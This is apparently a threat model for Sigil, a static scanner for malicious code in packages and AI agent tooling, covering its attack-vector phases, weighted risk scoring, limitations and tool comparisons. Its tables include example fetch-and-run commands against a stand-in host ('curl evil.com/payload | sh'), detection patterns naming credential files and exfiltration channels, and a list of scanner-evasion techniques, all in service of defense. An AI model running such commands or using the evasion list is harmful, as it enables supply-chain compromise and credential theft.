# Sigil Threat Model

## Overview

Sigil is designed to detect **intentionally malicious code** in AI agent tooling, MCP servers, and software packages before they execute in a developer's environment. This document describes the attack vectors Sigil covers, the risk scoring methodology, known limitations, and how Sigil compares to existing security tools.

## Attack Vectors by Scan Phase

### Phase 1: Install Hooks (Critical -- Weight 10x)

Install hooks are the highest-risk vector because they execute automatically during package installation, before the developer has a chance to review any code.

**Attack vectors detected:**

| Vector | Description | Example |
|--------|-------------|---------|
| Python `setup.py` cmdclass | Custom install commands that execute during `pip install` | `cmdclass={'install': MaliciousInstall}` with `os.system('curl ...')` |
| Python `setup.py` subprocess | Direct shell commands in setup scripts | `subprocess.call(['bash', '-c', 'curl evil.com/payload | sh'])` |
| npm lifecycle scripts | `preinstall`, `postinstall`, `preuninstall` hooks in `package.json` | `"postinstall": "node install.js"` where `install.js` exfiltrates data |
| Makefile install targets | Install rules that download or execute remote code | `install: curl -sSL evil.com/payload | bash` |

**Why 10x weight:** Install hooks run with the developer's full permissions, often as root during system-wide installs. A single malicious postinstall script can exfiltrate all credentials on the machine in under a second. The developer never sees the code execute.

### Phase 2: Code Patterns (High -- Weight 5x)

Dangerous code execution patterns that enable arbitrary code execution, deserialization attacks, or dynamic imports.

**Attack vectors detected:**

| Vector | Description | Risk |
|--------|-------------|------|
| `eval()` / `exec()` | Arbitrary code execution from strings | Attacker can execute any code by controlling the input string |
| `compile()` | Dynamic code compilation | Often used to hide eval-equivalent behavior |
| `__import__()` / `importlib` | Dynamic module loading | Can import and execute arbitrary modules at runtime |
| `subprocess` with `shell=True` | Shell injection | Allows command injection if input is not sanitized |
| `os.system()` / `os.popen()` | Direct shell execution | Full shell access with the process's permissions |
| `pickle.loads()` / `marshal.loads()` | Unsafe deserialization | Pickle can execute arbitrary code during deserialization |
| `yaml.load()` (unsafe) | YAML deserialization | PyYAML's `yaml.load()` without `Loader=SafeLoader` can execute code |
| `ctypes.cdll` | Foreign function interface | Can load and call arbitrary native libraries |
| `child_process` (Node.js) | Shell execution in Node | `exec`, `spawn`, `execFile` with unsanitized input |
| `Function()` / `vm.runInNewContext` | Dynamic code evaluation in JS | JavaScript equivalents of `eval()` |

**Why 5x weight:** These patterns are the building blocks of most malicious payloads. While legitimate code sometimes uses `eval()` or `subprocess`, their presence in untrusted code is a strong signal of malicious intent.

### Phase 3: Network and Exfiltration (High -- Weight 3x)

Outbound network calls that could exfiltrate data or establish command-and-control channels.

**Attack vectors detected:**

| Vector | Description | Risk |
|--------|-------------|------|
| `requests.post` / `requests.put` | Outbound HTTP in Python | Data exfiltration via POST to attacker-controlled server |
| `urllib.request.urlopen` | Standard library HTTP | Often used in packages to avoid `requests` dependency |
| `fetch()` / `XMLHttpRequest` | Browser/Node HTTP | Data exfiltration in JavaScript |
| `axios.post` | Popular HTTP client | Same risk as fetch/requests |
| `socket.connect` | Raw TCP sockets | Low-level data exfiltration or C2 channel |
| WebSocket connections | Persistent bidirectional channels | Real-time C2 or data streaming |
| ngrok tunnels | Reverse proxy tunnels | Expose local services to the internet |
| Webhook patterns | Discord/Telegram/Slack webhooks | Common exfiltration targets for stolen credentials |
| DNS tunneling | Data encoded in DNS queries | Bypasses firewall rules that allow DNS |

**Why 3x weight:** Network calls are common in legitimate software, so the weight is lower than code execution. However, outbound HTTP in a package that should be a string utility is a major red flag.

### Phase 4: Credentials (Medium -- Weight 2x)

Patterns that access environment variables, configuration files, or credential stores.

**Attack vectors detected:**

| Vector | Description | Risk |
|--------|-------------|------|
| `os.environ` / `process.env` | Environment variable access | API keys, database URLs, and secrets are commonly stored in env vars |
| `.aws/credentials` | AWS credential file | Full AWS account access |
| `.kube/config` | Kubernetes configuration | Cluster access with stored credentials |
| `ssh/` directory access | SSH key access | Server access via stolen keys |
| API key patterns | Regex-matched key formats | `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `AWS_SECRET`, etc. |
| `DATABASE_URL` | Database connection strings | Often contain embedded credentials |
| Keychain/credential store | OS credential manager access | Broad credential theft |

**Why 2x weight:** Many legitimate packages read environment variables for configuration. The weight is lower to reduce noise, but credential access combined with network exfiltration (Phase 3) is a strong signal.

### Phase 5: Obfuscation (High -- Weight 5x)

Techniques used to hide malicious code from human review and automated scanning.

**Attack vectors detected:**

| Vector | Description | Risk |
|--------|-------------|------|
| `base64.b64decode` / `atob()` | Base64 decoding | Hide URLs, code, or credentials in base64 strings |
| `Buffer.from(x, 'base64')` | Node.js base64 | Same as above, Node.js variant |
| Hex-encoded strings | `\x41\x42\x43` patterns | Hide strings from grep-based scanning |
| `String.fromCharCode` | Character code construction | Build strings character-by-character to avoid detection |
| `charCodeAt` | Character code extraction | Often paired with fromCharCode for encoding/decoding |
| Minified payloads | Compressed/minified code | Intentionally unreadable code that may hide malicious logic |

**Why 5x weight:** Legitimate code rarely uses obfuscation. When a package contains base64-decoded strings that are then eval'd, it is almost certainly malicious. Obfuscation is the strongest single indicator of malicious intent.

### Phase 6: Provenance (Low -- Weight 1-3x)

Metadata analysis that assesses the trustworthiness of the code's origin.

**Attack vectors detected:**

| Vector | Weight | Description |
|--------|--------|-------------|
| Shallow git history | 2x | Fewer than 3 commits suggests the repo was created recently for a specific purpose |
| Single author | 1x | Combined with other signals, single-author repos are higher risk |
| Binary/executable files | 10x | Pre-compiled binaries can contain anything and cannot be scanned |
| Hidden files | 1x | Files starting with `.` (excluding standard ones like `.gitignore`) |
| `.env` files | 1x | May contain credentials or be designed to override the developer's environment |
| Large files (>1MB) | 1x | Unusual file sizes may indicate embedded payloads |
| Filesystem manipulation | 3x | `shutil.rmtree`, `os.remove`, `rimraf`, `/etc/passwd`, `chmod 777` |

**Why variable weight:** Provenance signals are contextual. A repo with 2 commits is not inherently dangerous, but a 2-commit repo that also triggers Phase 1 and Phase 5 is extremely suspicious.

## Risk Scoring Methodology

### Score Calculation

Each scan phase produces a finding count. The risk score is computed as:

```
total_score = sum(finding_count_per_rule * phase_weight)
```

Phase weights:

| Phase | Weight | Rationale |
|-------|--------|-----------|
| 1 (Install Hooks) | 10x | Runs automatically, highest impact |
| 2 (Code Patterns) | 5x | Enables arbitrary execution |
| 3 (Network/Exfil) | 3x | Common in legitimate code, needs context |
| 4 (Credentials) | 2x | High false positive rate |
| 5 (Obfuscation) | 5x | Strongest intent signal |
| 6 (Provenance) | 1-3x | Contextual, metadata-based |

### Verdict Thresholds

| Score Range | Verdict | Recommended Action |
|-------------|---------|-------------------|
| 0 | **CLEAN** | Safe to approve |
| 1--9 | **LOW RISK** | Review flagged items, likely safe |
| 10--24 | **MEDIUM RISK** | Manual review recommended before approval |
| 25--49 | **HIGH RISK** | Do not approve without thorough review |
| 50+ | **CRITICAL RISK** | Reject -- multiple red flags detected |

### Score Composition Example

A package with the following findings:

| Finding | Phase | Count | Weight | Score |
|---------|-------|-------|--------|-------|
| npm postinstall hook | 1 | 1 | 10x | 10 |
| `eval()` in source | 2 | 1 | 5x | 5 |
| `fetch()` call | 3 | 1 | 3x | 3 |
| `process.env` access | 4 | 1 | 2x | 2 |
| base64 decode | 5 | 1 | 5x | 5 |
| 2 commits, 1 author | 6 | 1 | 2x | 2 |
| **Total** | | | | **27** |

Verdict: **HIGH RISK** -- this combination (install hook + eval + network + credentials + obfuscation + new repo) is the classic profile of a malicious package.

## Known Limitations

### False Positives

Sigil uses pattern matching, which means legitimate code can trigger findings.

**Common false positive scenarios:**

| Scenario | Phase | Why It Triggers | Mitigation |
|----------|-------|----------------|------------|
| Test frameworks using `eval()` | 2 | Testing code that evaluates expressions | Test files are partially filtered but may still match |
| HTTP client libraries | 3 | Libraries like `requests` or `axios` exist to make HTTP calls | Expected for networking packages, but flags in utility packages |
| Configuration loaders reading env vars | 4 | `os.environ` in config modules is standard practice | Low weight (2x) reduces impact |
| Base64 in data processing | 5 | Image processing, encoding utilities, JWT handling | Context is not analyzed; base64 alone gets flagged |
| New open-source projects | 6 | Legitimate new repos have few commits | Low weight (1-2x) keeps score manageable |
| Legitimate pre-commit hooks | 1 | Projects with build steps in install hooks | Review the specific hook content manually |

### False Negatives

Sigil does **not** catch everything. The following attack vectors may evade detection.

**Patterns that may bypass scanning:**

| Evasion Technique | Why It Works |
|-------------------|-------------|
| Multi-stage payloads | First-stage code is clean; it downloads the malicious payload at runtime |
| Dependency confusion | Malicious code is in a transitive dependency, not the scanned package |
| Time-delayed execution | Code that only activates after a delay or on a specific date |
| Environment-conditional | Code that only runs in CI/CD or production, not during scan |
| Custom encoding | Encoding schemes beyond base64/hex/charCode are not detected |
| Steganography | Malicious code hidden in images or data files |
| Native extensions | C/C++ extensions compiled at install time bypass pattern matching |
| Legitimate-looking code | Well-written malicious code that mimics normal patterns |

## What Sigil Does NOT Protect Against

Sigil is a **static analysis and metadata tool**. It does not provide:

1. **Runtime protection** -- Sigil does not sandbox or monitor code during execution. Once you approve a package, Sigil is no longer involved.

2. **Dependency tree analysis** -- Sigil scans the direct package you point it at. It does not recursively scan all transitive dependencies (though external tools like `npm audit` and `safety` can be integrated).

3. **Binary analysis** -- Sigil detects the presence of binary files (Phase 6) but cannot analyze what they do. Pre-compiled native extensions, Go binaries, or Rust binaries are opaque to Sigil.

4. **Network-level protection** -- Sigil detects patterns that suggest network exfiltration but does not block network traffic. A package approved by Sigil can still make network calls at runtime.

5. **Supply chain integrity** -- Sigil does not verify package signatures, registry integrity, or build reproducibility. It analyzes code content, not the chain of custody.

6. **Vulnerability scanning (CVEs)** -- Sigil does not maintain a CVE database. For known vulnerability scanning, use tools like Snyk, Dependabot, or `npm audit`. Sigil integrates with these tools but does not replace them.

7. **Sandbox escape detection** -- If malicious code can escape a container, VM, or browser sandbox, Sigil's static analysis will not detect the escape technique.

8. **Social engineering** -- Sigil cannot detect a legitimate-looking README that tricks users into running dangerous commands manually.

## Comparison with Existing Tools

### Feature Matrix

| Capability | Sigil | Snyk | Socket.dev | Semgrep | CodeQL |
|-----------|-------|------|-----------|---------|--------|
| **Primary focus** | Malicious code detection | Known CVEs | Supply chain (npm) | Code patterns | Code analysis |
| **Quarantine workflow** | Yes | No | No | No | No |
| **AI agent / MCP focus** | Yes | No | Partial | No | No |
| **Install hook scanning** | Yes (Phase 1) | No | Yes | No | No |
| **Credential exfil detection** | Yes (Phase 3+4) | No | Partial | Requires rules | Requires rules |
| **Obfuscation detection** | Yes (Phase 5) | No | Yes | Requires rules | No |
| **Provenance analysis** | Yes (Phase 6) | No | Yes | No | No |
| **Multi-ecosystem** | pip, npm, git, URL | pip, npm, etc. | npm only | Any (with rules) | GitHub repos only |
| **Offline operation** | Full CLI offline | No | No | Yes | Yes (local) |
| **Community threat intel** | Yes (authenticated) | Advisory DB | Yes | Community rules | No |
| **CI/CD integration** | Team tier | Yes | Yes | Yes | GitHub-native |
| **Free tier** | Full CLI, all phases | Limited scans | Limited | OSS free | Public repos |
| **Runtime analysis** | No | No | No | No | No |
| **CVE database** | No (integrates) | Yes | Yes | No | Yes (via advisories) |

### When to Use Each Tool

**Use Sigil when:**
- Installing packages from unknown authors or small projects
- Cloning repositories from tutorials, Discord, or social media
- Evaluating MCP servers, agent skills, or AI tooling
- You need a quarantine-first workflow that prevents execution before review
- Working offline or in air-gapped environments

**Use Snyk / Dependabot when:**
- Monitoring known CVEs in your dependency tree
- Automated PR-based dependency updates
- License compliance scanning

**Use Socket.dev when:**
- Deep supply chain analysis of npm packages
- Typosquat detection in the npm ecosystem

**Use Semgrep when:**
- Writing custom code analysis rules for your organization
- Enforcing coding standards across a codebase
- SAST in CI/CD pipelines with project-specific rules

**Use CodeQL when:**
- Deep semantic analysis of code hosted on GitHub
- Complex data flow and taint analysis
- Finding subtle logic vulnerabilities (not malicious intent)

### Complementary Usage

Sigil is designed to complement, not replace, these tools. The recommended setup for maximum coverage:

```
Pre-install:    Sigil (quarantine + scan for malicious intent)
Post-install:   Snyk / npm audit / safety (CVE scanning)
CI/CD:          Semgrep + Sigil (patterns + malice detection)
GitHub repos:   CodeQL (deep analysis) + Sigil (quick scan)
npm packages:   Socket.dev + Sigil (supply chain + quarantine)
```
